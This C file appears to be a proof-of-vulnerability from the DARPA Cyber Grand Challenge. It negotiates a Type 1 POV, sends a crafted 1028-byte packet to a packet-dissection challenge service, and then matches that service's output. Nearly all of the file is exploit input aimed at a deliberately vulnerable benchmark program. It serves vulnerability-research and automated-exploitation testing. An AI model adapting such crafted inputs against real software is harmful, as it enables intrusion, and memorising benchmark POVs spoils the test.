#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x01\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\xd9\x1c\x1b\x01"
         "\x1d\x06\xbf\xa3\x86\xe5\x0f\x44\xc7\x01\x00\x00\x63\x03\x86\x76"
         "\xe4\xa1\x61\x32\x69\x10\x52\x50\x4e\x3f\xca\xcb\x55\x6d\xc3\x5a"
         "\x2d\xf9\x36\x73\x8f\x5d\xbd\x23\xfa\x61\x13\x5d\x11\xa0\x3e\x40"
         "\x83\x36\x32\xf1\x37\x0b\x6b\x1f\x9e\x50\x01\x96\x3c\x75\xa6\xa5"
         "\x1b\x49\xd5\x34\x5b\x79\x59\x30\xdf\x15\x61\x1c\x9e\x29\xb3\xc3"
         "\x7f\x3b\xb0\xae\x31\x10\x2b\xcd\x66\x79\xa9\xfc\x3b\xe2\x46\x01"
         "\xd3\x7c\x50\x9c\xd0\x6a\x74\x62\x47\x68\x33\xb5\x0e\xf2\x06\x45"
         "\x15\x33\x2f\x29\xf1\x22\x83\x9d\xdd\xaf\xe9\x08\xa0\x27\x4e\x1a"
         "\xed\xbd\x49\x42\x4b\x18\x7e\x14\xc2\x85\x00\xd1\x05\xa4\xf6\x34"
         "\xe2\x88\x74\x4f\xee\xaa\x3e\xa4\x62\xad\x94\x56\x77\xa2\x2e\xe6"
         "\x8e\x8f\xb3\xc4\x56\x0e\x22\x89\xd5\xb6\x17\x67\xe4\x78\x47\x89"
         "\xe8\x77\x95\x70\x08\x53\xe4\x65\xe5\x40\xe8\xcf\x42\xd4\xb6\xc1"
         "\x95\xb5\x85\xe7\x87\xb5\x51\xa4\xf7\x61\x74\xa2\x4b\xa6\x38\x3c"
         "\x7d\xe0\xd2\x2b\x81\xab\x38\x92\x22\xbf\x17\x15\x0c\xf7\x49\x02"
         "\xf9\xc7\xee\x9a\x52\x7f\x78\x1a\x38\xa4\xeb\x22\x8d\x73\x25\xab"
         "\x7b\xbb\x3b\x5c\x53\xa7\x2f\x19\x6a\x42\xee\x1b\x35\xb1\xc2\xe9"
         "\x86\xbb\x2e\x7f\x65\xbe\x86\x78\xc7\x18\x62\xf7\x5e\xb8\xd2\xe0"
         "\x83\x4c\x96\x99\x3c\x58\xdd\xad\xbd\xe9\x4d\xaa\xc9\xb7\x2f\x3f"
         "\x43\xaf\xa6\x22\x04\x95\x6f\x0e\x32\x47\x2d\x5a\x88\x7f\xd8\x05"
         "\x3b\xb5\xf9\xe3\x49\x17\xea\x2d\x38\xb2\x55\xfc\xbc\xd4\x52\x2a"
         "\x94\x98\xee\xd0\xeb\x2c\xcc\x1d\x50\x4c\x6f\x31\x53\x8e\x96\x8d"
         "\x95\x6e\x49\xbe\xd7\x75\x35\x36\x9f\x75\x4a\x2d\xd4\x1c\xe2\x52"
         "\xe6\xfa\xc6\x13\x00\x49\x96\xf1\x4b\x5f\xb9\x7d\x38\x48\x03\xc6"
         "\xe6\x7f\xab\x18\x3c\xe2\x59\x89\xb0\xc3\x33\xe0\x45\xbc\xf5\x67"
         "\x5d\xf3\xe0\x5f\xc6\x38\xf6\x51\x8d\x95\x78\xf6\x47\x79\x91\xfa"
         "\x1b\x2b\x1c\x1a\xba\x33\xee\x82\x61\x1a\xfc\x66\x23\x64\x1e\x28"
         "\x33\x60\x29\xea\x7c\xa7\xa5\x7c\x05\x9c\x3f\x6f\x93\xd0\x90\x27"
         "\x46\xd9\x7e\xe4\x4c\xf1\x2c\xd0\x8e\x50\xf4\x94\x2e\x81\x2f\x6f"
         "\x79\xb0\x2d\x78\x73\x20\xe3\x6d\x23\x40\xdc\xea\x94\x7d\xb9\xa3"
         "\xee\x38\x2d\x51\x29\x52\xb1\xac\xbf\xa9\x83\x08\xc8\x97\xb6\x2c"
         "\xbe\x07\xaf\xbb\xc1\x4f\x1f\xaa\x8c\x9e\xdb\xc3\x81\x23\xb2\xf2"
         "\x7e\x55\xc6\xe5\x05\x6e\xe5\xfd\xe4\x16\x72\x9c\x62\x7e\xa6\xc7"
         "\x79\xee\x60\xec\x3d\x4a\xad\x64\x34\x72\x2e\xcb\x46\x2d\xe2\x8e"
         "\x26\x6d\x75\xdd\xc0\x0c\xe9\xf2\xea\x11\x13\x00\x25\x10\x8e\x0c"
         "\xbc\x99\xda\x02\xa3\x5d\x19\x64\x52\x72\x1c\x82\xf1\x9c\x11\x57"
         "\x41\x43\xeb\xea\xe6\x48\xf7\x80\x24\x96\x38\xc9\xb0\xad\x2a\xfc"
         "\x0e\xa6\x68\x52\x92\x4d\x59\xe9\x95\x73\x2c\x97\x8a\xb4\xe4\xbc"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===lol
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6f\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===acquisitumvaletudinarist
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x61\x63\x71\x75\x69\x73\x69\x74\x75\x6d\x76"
         "\x61\x6c\x65\x74\x75\x64\x69\x6e\x61\x72\x69\x73\x74";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
